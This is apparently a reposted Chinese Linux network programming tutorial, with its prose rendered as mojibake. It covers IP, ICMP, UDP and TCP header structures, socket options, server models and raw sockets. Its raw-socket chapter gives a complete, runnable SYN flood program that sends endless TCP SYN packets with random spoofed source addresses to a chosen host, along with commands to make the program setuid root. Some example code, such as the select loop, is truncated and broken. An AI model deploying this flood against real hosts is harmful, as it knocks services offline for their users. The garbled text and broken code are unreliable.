        unsigned int ip_hl:4;           /* header length */
        unsigned int ip_v:4;            /* version */
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
        unsigned int ip_v:4;            /* version */
        unsigned int ip_hl:4;           /* header length */
#endif
        u_int8_t ip_tos;                /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
#define IP_RF 0x8000                    /* reserved fragment flag */
#define IP_DF 0x4000                    /* dont fragment flag */
#define IP_MF 0x2000                    /* more fragments flag */
#define IP_OFFMASK 0x1fff               /* mask for fragmenting bits */
        u_int8_t ip_ttl;                /* time to live */
        u_int8_t ip_p;                  /* protocol */
        u_short ip_sum;                 /* checksum */
        struct in_addr ip_src, ip_dst;  /* source and dest address */
  };
/*
ip_vIPЭ��İ汾��,������4,����IPV6�Ѿ�������

ip_hlIP���ײ�����,���ֵ��4�ֽ�Ϊ��λ.IPЭ���ײ��Ĺ̶�����Ϊ20���ֽ�,���IP��û��ѡ��,��ô���ֵΪ5.

ip_tos��������,˵���ṩ������Ȩ.

ip_len˵��IP���ݵĳ���.���ֽ�Ϊ��λ.

ip_id��ʶ���IP���ݰ�.

ip_off��Ƭƫ��,�������IDһ������������Ƭ��.

ip_ttl����ʱ��.û����һ��·�ɵ�ʱ���һ,ֱ��Ϊ0ʱ������.

ip_pЭ��,��ʾ�������IP���ݰ��ĸ߲�Э��.��TCP,UDPЭ��.

ip_sum�ײ�У���,�ṩ���ײ����ݵ�У��.

ip_src,ip_dst�����ߺͽ����ߵ�IP��ַ

����IPЭ�����ϸ���,��ο� RFC791

7.3 ICMPЭ�� 
ICMP����Ϣ����Э��,Ҳ���������.�������ϴ���IP���ݰ�ʱ,��������˴���,��ô�ͻ���ICMPЭ�����������.

ICMP���Ľṹ����:

0              8               16                              32
---------------------------------------------------------------------
|       ����    |       ����    |       У���                  |
--------------------------------------------------------------------
|               ����            |       ����                    |
--------------------------------------------------------------------

ICMP���еĶ����� */
struct icmphdr
{
  u_int8_t type;                /* message type */
  u_int8_t code;                /* type sub-code */
  u_int16_t checksum;
  union
  {
    struct
    {
      u_int16_t id;
      u_int16_t sequence;
    } echo;                     /* echo datagram */
    u_int32_t   gateway;        /* gateway address */
    struct
    {
      u_int16_t __unused;
      u_int16_t mtu;
    } frag;                     /* path mtu discovery */
  } un;
};
/*
����ICMPЭ�����ϸ������Բ鿴 RFC792

7.4 UDPЭ�� 
UDPЭ���ǽ�����IPЭ�����֮�ϵ�,���ڴ�����Э��.UDP��IPЭ��һ���ǲ��ɿ������ݱ�����.UDP��ͷ��ʽΪ:


0                      16                      32
---------------------------------------------------
|       UDPԴ�˿�       |       UDPĿ�Ķ˿�     |
---------------------------------------------------
|       UDP���ݱ�����   |       UDP���ݱ�У��   |
---------------------------------------------------

UDP�ṹ���еĶ���Ϊ: 
struct udphdr {
  u_int16_t     source;
  u_int16_t     dest;
  u_int16_t     len;
  u_int16_t     check;
};

����UDPЭ�����ϸ���,��ο� RFC768
7.5 TCP 
TCPЭ��Ҳ�ǽ�����IPЭ��֮�ϵ�,����TCPЭ���ǿɿ���.����˳���͵�.TCP�����ݽṹ��ǰ��Ľṹ��Ҫ����.

0       4       8  10           16              24              32
-------------------------------------------------------------------
|               Դ�˿�          |               Ŀ�Ķ˿�        |
-------------------------------------------------------------------
|                               ���к�                          |
------------------------------------------------------------------
|                               ȷ�Ϻ�                          |
------------------------------------------------------------------
|        |            |U|A|P|S|F|                               |
|�ײ�����| ����       |R|C|S|Y|I|       ����                    |
|        |            |G|K|H|N|N|                               |
-----------------------------------------------------------------
|               У���          |               ����ָ��        |
-----------------------------------------------------------------
|                       ѡ��                    |    ����ֽ�   |
-----------------------------------------------------------------

TCP�Ľṹ���ж���Ϊ: 
struct tcphdr
  {
    u_int16_t source;
    u_int16_t dest;
    u_int32_t seq;
    u_int32_t ack_seq;
#if __BYTE_ORDER == __LITTLE_ENDIAN
    u_int16_t res1:4;
    u_int16_t doff:4;
    u_int16_t fin:1;
    u_int16_t syn:1;
    u_int16_t rst:1;
    u_int16_t psh:1;
    u_int16_t ack:1;
    u_int16_t urg:1;
    u_int16_t res2:2;
#elif __BYTE_ORDER == __BIG_ENDIAN
    u_int16_t doff:4;
    u_int16_t res1:4;
    u_int16_t res2:2;
    u_int16_t urg:1;
    u_int16_t ack:1;
    u_int16_t psh:1;
    u_int16_t rst:1;
    u_int16_t syn:1;
    u_int16_t fin:1;
#endif
    u_int16_t window;
    u_int16_t check;
    u_int16_t urg_prt;
};     

source����TCP���ݵ�Դ�˿� 
dest����TCP���ݵ�Ŀ�Ķ˿�

seq��ʶ��TCP�������������ֽڵĿ�ʼ���к�

ack_seqȷ�����к�,��ʾ���ܷ���һ�ν��ܵ��������к�.

doff�����ײ�����.��IPЭ��һ��,��4�ֽ�Ϊ��λ.һ���ʱ��Ϊ5

urg������ý�������ָ��,���λΪ1

ack���ȷ�Ϻ���ȷ,��ôΪ1

psh�������Ϊ1,��ô���շ��յ����ݺ�,����������һ�����

rstΪ1��ʱ��,��ʾ������������

synΪ1��ʱ��,��ʾ����������

finΪ1��ʱ��,��ʾ���ݹر�����

window����,���߽����߿��Խ��յĴ�С

check��TCP���ݽ��нϺ�

urg_ptr���urg=1,��ôָ���������ݶ�����ʷ���ݿ�ʼ�����кŵ�ƫ��ֵ

����TCPЭ�����ϸ���,��鿴 RFC793


7.6 TCP���ӵĽ��� 
TCPЭ����һ�ֿɿ�������,Ϊ�˱�֤���ӵĿɿ���,TCP������Ҫ��Ϊ��������.���ǰ�������ӹ��̳�Ϊ"��������".

�������Ǵ�һ��ʵ���������������ӵĹ���.

��һ���ͻ��������������һ��TCP���ݰ�,��ʾ����������. Ϊ��,�ͻ��˽����ݰ���SYNλ����Ϊ1,
�����������к�seq=1000(���Ǽ���Ϊ1000).

�ڶ����������յ������ݰ�,����SYNλΪ1֪������һ���������������.���Ƿ�����Ҳ��ͻ��˷���һ��TCP���ݰ�.
��Ϊ����Ӧ�ͻ���������, ���Ƿ���������ACKΪ1,sak_seq=1001(1000+1)ͬʱ�����Լ������к�.seq=2000(���Ǽ���Ϊ2000).

�������ͻ����յ��˷�������TCP,����ACKΪ1��ack_seq=1001֪���Ǵӷ���������ȷ����Ϣ.���ǿͻ���Ҳ�����������ȷ����Ϣ.
�ͻ�������ACK=1,��ack_seq=2001,seq=1001,���͸�������.���˿ͻ����������.

���һ���������ܵ�ȷ����Ϣ,Ҳ�������.

ͨ�����漸������,һ��TCP���Ӿͽ�����.��Ȼ�ڽ��������п��ܳ��ִ���,����TCPЭ����Ա�֤�Լ�ȥ��������.


˵һ˵���е�һ�ִ���.
  ��˵��DOS��?(�ɲ��ǲ���ϵͳ��).���괺�ڵ�ʱ��,�����������վһ���ܵ�����.�������õľ���DOS(�ܾ�ʽ����)��ʽ.
  ������˵һ��ԭ��.�ͻ����Ƚ��е�һ������.�������յ���,���еڶ�������.����������TCP����,�ͻ���Ӧ�ý��е���������.
  ����������ʵ���ϲ������е���������.��Ϊ�ͻ����ڽ��е�һ�������ʱ��,�޸����Լ���IP��ַ,����˵��һ��ʵ���ϲ����ڵ�
  IP������Լ�IP ���ݰ��ķ����ߵ�IPһ��.������Ϊ����������IP��ַû���˽���,���Է���˻��ղ��������������ȷ���ź�,
  ����������˻����Ǳ�һֱ�ȴ�,ֱ����ʱ.�������д����Ŀͻ����������,����˻��д����ȴ�,ֱ�����е���Դ���ù�,
  �������ٽ��տͻ���������.�������������û����������������ʱ,����û������Դ�����ܳɹ�.
  ���Ǿͳ����˴���ʱ�����ֵ����.


(��)Linux������--8. �׽���ѡ��

��ʱ������Ҫ�����׽��ֵ���Ϊ(���޸Ļ������Ĵ�С),���ʱ�����Ǿ�Ҫ�����׽��ֵ�ѡ����.


8.1 getsockopt��setsockopt

int getsockopt(int sockfd,int level,int optname,void *optval,socklen_t *optlen)
int setsockopt(int sockfd,int level,int optname,const void *optval,socklen_t *optlen)

levelָ�������׽��ֵĲ��.����ȡ����ֵ: 
        1)SOL_SOCKET:ͨ���׽���ѡ��. 
        2)IPPROTO_IP:IPѡ��. 
        3)IPPROTO_TCP:TCPѡ��. 
optnameָ�����Ƶķ�ʽ(ѡ�������),����������ϸ����

optval��û����������׽���ѡ��.����ѡ�����Ƶ��������ͽ���ת��


ѡ������                ˵��                                    ��������
========================================================================
                        SOL_SOCKET
------------------------------------------------------------------------
SO_BROADCAST            �����͹㲥����                        int
SO_DEBUG                �������                                int
SO_DONTROUTE            ������·��                              int
SO_ERROR                ����׽��ִ���                          int
SO_KEEPALIVE            ��������                                int
SO_LINGER               �ӳٹر�����                            struct linger
SO_OOBINLINE            �������ݷ�������������                  int
SO_RCVBUF               ���ջ�������С                          int
SO_SNDBUF               ���ͻ�������С                          int
SO_RCVLOWAT             ���ջ���������                          int
SO_SNDLOWAT             ���ͻ���������                          int
SO_RCVTIMEO             ���ճ�ʱ                                struct timeval
SO_SNDTIMEO             ���ͳ�ʱ                                struct timeval
SO_REUSERADDR           �������ñ��ص�ַ�Ͷ˿�                  int
SO_TYPE                 ����׽�������                          int
SO_BSDCOMPAT            ��BSDϵͳ����                           int
==========================================================================
                        IPPROTO_IP
--------------------------------------------------------------------------
IP_HDRINCL              �����ݰ��а���IP�ײ�                    int
IP_OPTINOS              IP�ײ�ѡ��                              int
IP_TOS                  ��������
IP_TTL                  ����ʱ��                                int
==========================================================================
                        IPPRO_TCP
--------------------------------------------------------------------------
TCP_MAXSEG              TCP������ݶεĴ�С                     int
TCP_NODELAY             ��ʹ��Nagle�㷨                         int
=========================================================================

������Щѡ�����ϸ�����鿴 Linux Programmer's Manual

8.2 ioctl 
ioctl���Կ������е��ļ������������,�������һ�¿����׽��ֵ�ѡ��.

int ioctl(int fd,int req,...)

==========================================================================
                        ioctl�Ŀ���ѡ��
--------------------------------------------------------------------------
SIOCATMARK              �Ƿ񵽴������                        int
FIOASYNC                �첽����/�����־                       int
FIONREAD                �������ɶ����ֽ���                      int
==========================================================================

��ϸ��ѡ������ man ioctl_list �鿴.


(��)Linux������--9. ������ģ��

ѧϰ����������̡���.������̿���ÿһ������Ա"����"�Ŀγ̰�.�����û��ѧϰ��, ������ȥ��һ��. ����һ������,
����һ������������̵ĽǶ�ѧϰ�����̵�˼��.������д����֮ǰ, ���Ƕ�Ӧ�ô�������̵ĽǶȹ滮�����ǵ����,
�������ǿ��������Ч�ʲŻ��. �������������,һ�����˵�������ͻ�����Ӧһ��������.Ϊ�˴���ͻ���������, 
�Է���˵ĳ��������������Ҫ��.����ѧϰһ��Ŀǰ��õķ�����ģ��.

<һ>ѭ��������:ѭ����������ͬһ��ʱ��ֻ������Ӧһ���ͻ��˵�����

<��>����������:������������ͬһ��ʱ�̿�����Ӧ����ͻ��˵�����


9.1 ѭ��������:UDP������ 
        UDPѭ����������ʵ�ַǳ���:UDP������ÿ�δ��׽����϶�ȡһ���ͻ��˵�����,����, Ȼ�󽫽�����ظ��ͻ���. 
������������㷨��ʵ��.

   socket(...);
   bind(...);
   while(1)
    {
         recvfrom(...);
         process(...);
         sendto(...);
   }
��ΪUDP�Ƿ��������ӵ�,û��һ���ͻ��˿�������ռס�����. ֻҪ������̲�����ѭ��, ����������ÿһ���ͻ��������������ܹ�����.

9.2 ѭ��������:TCP������ 
TCPѭ����������ʵ��Ҳ����:TCP����������һ���ͻ��˵�����,Ȼ����,���������ͻ������������,�Ͽ�����.

�㷨����: 
        socket(...);
        bind(...);
        listen(...);
        while(1)
        {
                accept(...);
                while(1)
                {
                        read(...);
                        process(...);
                        write(...);
                }
                close(...);
        }

TCPѭ��������һ��ֻ�ܴ���һ���ͻ��˵�����.ֻ��������ͻ����������������, �������ſ��Լ������������.
���������һ���ͻ���ռס����������ʱ,�����Ŀͻ��������ܹ�����.���,TCP������һ�������ѭ��������ģ�͵�.

9.3 ����������:TCP������ 
        Ϊ���ֲ�ѭ��TCP��������ȱ��,����������˲�����������ģ��. ������������˼����ÿһ���ͻ��������󲢲��ɷ�����
ֱ�Ӵ���,���Ƿ���������һ�� �ӽ���������.

�㷨����:

  socket(...);
  bind(...);
  listen(...);
  while(1)
  {
        accept(...);
        if(fork(..)==0)
          {
              while(1)
               {        
                read(...);
                process(...);
                write(...);
               }
           close(...);
           exit(...);
          }
        close(...);
  }    

TCP�������������Խ��TCPѭ���������ͻ�����ռ�����������. ����Ҳͬʱ������һ����С������.Ϊ����Ӧ�ͻ���������,
������Ҫ�����ӽ���������. �������ӽ�����һ�ַǳ�������Դ�Ĳ���.

9.4 ����������:��·����I/O 
Ϊ�˽�������ӽ��̴�����ϵͳ��Դ����,����������˶�·����I/Oģ��. 
���Ƚ���һ������select

int select(int nfds,fd_set *readfds,fd_set *writefds,
                fd_set *except fds,struct timeval *timeout)
void FD_SET(int fd,fd_set *fdset)
void FD_CLR(int fd,fd_set *fdset)
void FD_ZERO(fd_set *fdset)
int FD_ISSET(int fd,fd_set *fdset)

һ�����˵�����������ļ���дʱ,�����п����ڶ�д������,ֱ��һ������������. �������Ǵ�һ���׽��ֶ�����ʱ,���ܻ���������û�����ݿɶ� (ͨ�ŵĶԷ���û�� �������ݹ���),���ʱ�����ǵĶ����þͻ�ȴ�(����)ֱ�������ݿɶ�.������ǲ� ϣ������,���ǵ�һ��ѡ������selectϵͳ����. ֻҪ�������ú�select�ĸ�������,��ô���ļ����Զ�д��ʱ��select��"֪ͨ"���� ˵���Զ�д��. readfds����Ҫ�����ļ��ļ��������ļ��� 
writefds����Ҫ��д�ļ��ļ��������ļ���

exceptfds�����ķ�Ҫ������֪ͨ���ļ�������

timeout��ʱ����.

nfds�������Ǽ�ص��ļ���������������һ����1

�����ǵ���selectʱ���̻�һֱ����ֱ�����µ�һ���������. 1)���ļ����Զ�.2)���ļ�����д.3)��ʱ�����õ�ʱ�䵽.

Ϊ�������ļ�����������Ҫʹ�ü�����. FD_SET��fd���뵽fdset

FD_CLR��fd��fdset�������

FD_ZERO��fdset��������е��ļ�������

FD_ISSET�ж�fd�Ƿ���fdset������

ʹ��select��һ������
*/
int use_select(int *readfd,int n)
{
   fd_set my_readfd;
   int maxfd;
   int i;
   
   maxfd=readfd[0];
   for(i=1;i
    if(readfd[i]>maxfd) maxfd=readfd[i];
   while(1)
   {
        /*   �����е��ļ�����������   */
        FD_ZERO(&my_readfd);
        for(i=0;i
            FD_SET(readfd[i],*my_readfd);
        /*     ��������                 */
        select(maxfd+1,& my_readfd,NULL,NULL,NULL); 
        /*        �ж������Զ���       */
        for(i=0;i
          if(FD_ISSET(readfd[i],&my_readfd))
              {
                  /* ԭ�����ҿ��Զ���  */ 
                        we_read(readfd[i]);
              }
   }
}

/*ʹ��select�����ǵķ���������ͱ����.


        ��ʼ��(socket,bind,listen);
        
    while(1)
        {
        ���ü�����д�ļ�������(FD_*);   
        
        ����select;
        
        ����������׽��־���,˵��һ���µ�����������
             { 
                ��������(accept);
                ���뵽�����ļ���������ȥ;
             }
       ����˵����һ���Ѿ����ӹ���������
                {
                    ���в���(read����write);
                 }
                        
        }              

��·����I/O���Խ����Դ���Ƶ�����.��ģ��ʵ�����ǽ�UDPѭ��ģ��������TCP����. ��Ҳ�ʹ�����һЩ����.
�����ڷ��������δ���ͻ�������,���Կ��ܻᵼ���еĿͻ� ��ȴ��ܾ�.

9.5 ����������:UDP������ 
���ǰѲ����ĸ�������UDP�͵õ��˲���UDP������ģ��. ����UDP������ģ����ʵ�Ǽ򵥵�.�Ͳ�����TCP������ģ��һ���Ǵ���
һ���ӽ���������� �㷨�Ͳ�����TCPģ��һ��. 
���Ƿ������ڴ���ͻ��˵��������õ�ʱ��Ƚϳ�����,����ʵ���Ϻ���������ģ��.


9.6 һ������TCP������ʵ��
*/
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define MY_PORT         8888

int main(int argc ,char **argv)
{
int listen_fd,accept_fd;
struct sockaddr_in     client_addr;
int n;

if((listen_fd=socket(AF_INET,SOCK_STREAM,0))<0)
  {
        printf("Socket Error:%s\n\a",strerror(errno));
        exit(1);
  }

bzero(&client_addr,sizeof(struct sockaddr_in));
client_addr.sin_family=AF_INET;
client_addr.sin_port=htons(MY_PORT);
client_addr.sin_addr.s_addr=htonl(INADDR_ANY);
n=1;
/* �����������ֹ��,���������Եڶ��ο������������õȴ�һ��ʱ��  */
setsockopt(listen_fd,SOL_SOCKET,SO_REUSEADDR,&n,sizeof(int));
if(bind(listen_fd,(struct sockaddr *)&client_addr,sizeof(client_addr))<0)
  {
        printf("Bind Error:%s\n\a",strerror(errno));
        exit(1);
  }
  listen(listen_fd,5);
  while(1)
  {
   accept_fd=accept(listen_fd,NULL,NULL);
   if((accept_fd<0)&&(errno==EINTR))
          continue;
   else if(accept_fd<0)
    {
        printf("Accept Error:%s\n\a",strerror(errno));
        continue;
    }
  if((n=fork())==0)
   {
        /* �ӽ��̴���ͻ��˵����� */
        char buffer[1024];

        close(listen_fd);
        n=read(accept_fd,buffer,1024);
        write(accept_fd,buffer,n);
        close(accept_fd);
        exit(0);
   }
   else if(n<0)
        printf("Fork Error:%s\n\a",strerror(errno));
   close(accept_fd);
  }
}
/*
�����������ǰ��д�ͻ��˳����������ų���,����������telnet����


(ʮ)Linux������--10. ԭʼ�׽���

 ������ǰ���Ѿ�ѧϰ�����������������׽���(SOCK_STREAM,SOCK_DRAGM).����һ�� ��������һ����ѧϰ����
һ���׽���--ԭʼ�׽���(SOCK_RAW). Ӧ��ԭʼ�׽���,���ǿ��Ա�д����TCP��UDP�׽��ֲ��ܹ�ʵ�ֵĹ���. 
ע��ԭʼ�׽���ֻ�ܹ����� rootȨ�޵��˴���.

10.1 ԭʼ�׽��ֵĴ���

int sockfd(AF_INET,SOCK_RAW,protocol)

���Դ���һ��ԭʼ�׽���.����Э������Ͳ�ͬ���ǿ��Դ�����ͬ���͵�ԭʼ�׽��� ����:IPPROTO_ICMP,IPPROTO_TCP,IPPROTO_UDP�ȵ�.
��ϸ������鿴 socket��man�ֲ� ����������һ��ʵ����˵��ԭʼ�׽��ֵĴ�����ʹ��

10.2 һ��ԭʼ�׽��ֵ�ʵ�� 
���ǵ�DOS��ʲô��˼��?���������Ǿ�һ������дһ��ʵ��DOS��С����. �����ǳ����Դ����

/********************  DOS.c               *****************/
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define DESTPORT        80       /* Ҫ�����Ķ˿�(WEB)      */
#define LOCALPORT       8888

void send_tcp(int sockfd,struct sockaddr_in *addr);
unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char **argv)
{
int sockfd;
struct sockaddr_in addr;
struct hostent *host;
int on=1;

if(argc!=2)
{
        fprintf(stderr,"Usage:%s hostname\n\a",argv[0]);
        exit(1);
}

bzero(&addr,sizeof(struct sockaddr_in));
addr.sin_family=AF_INET;
addr.sin_port=htons(DESTPORT);

if(inet_aton(argv[1],&addr.sin_addr)==0)
{
        host=gethostbyname(argv[1]);
        if(host==NULL)
        {
                fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno));
                exit(1);
        }
        addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
}

/**** ʹ��IPPROTO_TCP����һ��TCP��ԭʼ�׽���    ****/

sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
if(sockfd<0)
{
        fprintf(stderr,"Socket Error:%s\n\a",strerror(errno));
        exit(1);
}
/********  ����IP���ݰ���ʽ,����ϵͳ�ں�ģ��IP���ݰ��������Լ�����д  ***/

setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));

/****  û�а취,ֻ�ó������û��ſ���ʹ��ԭʼ�׽���    *********/
setuid(getpid());

/*********  ����ը����!!!!          ****/
send_tcp(sockfd,&addr);
}

 

/*******  ����ը����ʵ��   *********/
void send_tcp(int sockfd,struct sockaddr_in *addr)
{
char buffer[100];  /**** �����������ǵ����ݰ�  ****/
struct ip *ip;
struct tcphdr *tcp;
int head_len;

/******* ���ǵ����ݰ�ʵ����û���κ�����,���Գ��Ⱦ��������ṹ�ĳ���  ***/

head_len=sizeof(struct ip)+sizeof(struct tcphdr);

bzero(buffer,100);

/********  ���IP���ݰ���ͷ��,���ǵ�IP��ͷ��ʽ��?     ******/ 
ip=(struct ip *)buffer;
ip->ip_v=IPVERSION;             /** �汾һ����� 4      **/
ip->ip_hl=sizeof(struct ip)>>2; /** IP���ݰ���ͷ������  **/
ip->ip_tos=0;                   /** ��������            **/
ip->ip_len=htons(head_len);     /** IP���ݰ��ĳ���      **/
ip->ip_id=0;                    /** ��ϵͳȥ��д��      **/
ip->ip_off=0;                   /** ������һ��,ʡ��ʱ�� **/        
ip->ip_ttl=MAXTTL;              /** ���ʱ��   255    **/
ip->ip_p=IPPROTO_TCP;           /** ����Ҫ������ TCP��  **/ 
ip->ip_sum=0;                   /** У�����ϵͳȥ��    **/
ip->ip_dst=addr->sin_addr;      /** ���ǹ����Ķ���      **/

/*******  ��ʼ��дTCP���ݰ�                           *****/
tcp=(struct tcphdr *)(buffer +sizeof(struct ip));
tcp->source=htons(LOCALPORT);
tcp->dest=addr->sin_port;           /** Ŀ�Ķ˿�    **/
tcp->seq=random();
tcp->ack_seq=0;
tcp->doff=5;
tcp->syn=1;                        /** ��Ҫ�������� **/
tcp->check=0;


/** ����,һ�ж�׼������.������,��׼������û��?? ^_^  **/
while(1)
  {
/**  �㲻֪�����Ǵ���������,������ȥ�Ȱ�!      **/
    ip->ip_src.s_addr=random();    

/** ʲô����ϵͳ����,Ҳû�ж�����˼,�����������Լ���У��ͷ���� */
/**            �����������п���    */
    tcp->check=check_sum((unsigned short *)tcp,
                sizeof(struct tcphdr)); 
    sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in));
  }
}

/* �������ײ�У��͵��㷨,͵�˱��˵� */
unsigned short check_sum(unsigned short *addr,int len)
{
register int nleft=len;
register int sum=0;
register short *w=addr;
  short answer=0;

while(nleft>1)
{
  sum+=*w++;
  nleft-=2;
}
if(nleft==1)
{
  *(unsigned char *)(&answer)=*(unsigned char *)w;
  sum+=answer;
}
  
sum=(sum>>16)+(sum&0xffff);
sum+=(sum>>16);
answer=~sum;
return(answer);
}
/*
����һ��,��localhost��һ��ʵ��,������ʲô���.(ǧ��Ҫ�Ա��˵İ�). Ϊ������ͨ�û����������������,
����Ӧ�ý��������������߱�Ϊroot,�� ����setuidλ

[root@hoyt /root]#chown root DOS
[root@hoyt /root]#chmod +s DOS


10.3 �ܽ� 
ԭʼ�׽��ֺ�һ����׽��ֲ�ͬ������ǰ�����ϵͳ��������,����Ҫ�������Լ�������. �����������ǲ����кܶ����Ȥ��. 
�����Ǵ�����һ�� TCP�׽��ֵ�ʱ��,����ֻ�Ǹ��������Ҫ���͵�����(buffer)���ݸ���ϵͳ. ϵͳ���յ����ǵ����ݺ�,
���Զ��ĵ�����Ӧ��ģ������ݼ���TCP ͷ��,Ȼ�����IPͷ��. �ٷ��ͳ�ȥ.�������������Լ�����������ͷ��,ϵͳֻ�ǰ�����
���ͳ�ȥ. �������ʵ����,��������Ҫ�޸����ǵ�ԴIP��ַ, ��������ʹ����setsockopt����,�������ֻ���޸�TCP����,
��ôIP����һ��Ҳ������ϵͳ��������.


11. ���
  �������������������̳�.�������Ҳ��д��һ������,ԭ����Ϊд���Ӧ����һ�� ���ѵ���,��������֪��ԭ���кܶ�ĵط�
�����������Ҫ��.�һ��Ѻܶ�Ķ�����ʡ�Ե��� ����д������ƪ�̳��Ժ�,�Һ�����������ʶ��������һ��. 
  �������ֻ�Ǳ�дһ��� ��������ǱȽ����׵�,�������������д���ȽϺõ�����������ǻ�����ңԶ��·Ҫ��. 
  �������һ�����˵���Ƕ���̼��϶��̵߳�.Ϊ�˴���������ڲ��Ĺ�ϵ,���ǻ�Ҫѧϰ ����֮���ͨ��.�������������������
  �����ͻ���¼�,Ϊ�����ǻ�Ҫȥѧϰ���߼��� �¼�����֪ʶ.���ڵ���ϢԽ��Խ����,Ϊ�˴������Щ��Ϣ,���ǻ�Ҫȥѧϰ���ݿ�.
  ���Ҫ��д�����õĺڿ����,���ǻ�Ҫȥ��Ϥ��������Э��.��֮����Ҫѧ�Ķ������ܶ�ܶ�. 
  ��һ����������ˮƽ,��һ��ӡ�ȵ����ˮƽ,����̨���ˮƽ,�ٿ�һ�������Լ��� ���ˮƽ��Ҿͻ�֪����ʲô�������.
  ���������õ�����м����������й����Լ���д��.  ������Ҳ�Ҫ����,���õ���.ֻҪ���ǻ������ѵ�,���ܹ��������Ǻͱ��˵�
  ���, ���Ǿͻ���ϣ��. �Ͼ��������ڻ�����.ֻҪ����Ŭ��,�����ȥѧϰ,����һ���ܹ�ѧ�õ�.���ǾͿ���׷�ϱ���ֱ����������!

����һ��:

            ���˿�������������һ����������,���ҿ��Աȱ������ĸ���!

   �¸ҵ�������,Ϊ������ΰ������������ҵ,Ϊ�������δ��,Ŭ����ȥ�ܶ���!������ס���ǵ�!

 

��������CSDN���ͣ�ת�������������http://blog.csdn.net/jenshy/archive/2006/04/18/667944.aspx